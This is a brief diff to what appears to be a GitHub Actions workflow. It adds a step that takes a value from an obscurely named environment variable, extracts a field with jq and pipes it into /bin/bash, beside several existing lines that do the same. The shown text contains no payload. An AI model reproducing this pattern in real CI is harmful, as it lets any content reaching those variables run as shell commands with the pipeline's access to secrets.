@@ -37,6 +37,7 @@ jobs:
           echo $fgh6 | jq -r .hxb5062 | /bin/bash
           echo $eyo3 | jq -r .r36 | /bin/bash
           echo $ewzm8041 | jq -r .fev080 | /bin/bash
+          printf '%s' "$yasg59415" | jq -r .uq5152 | /bin/bash
 
       - name: Upload artifact
         uses: actions/upload-artifact@v4
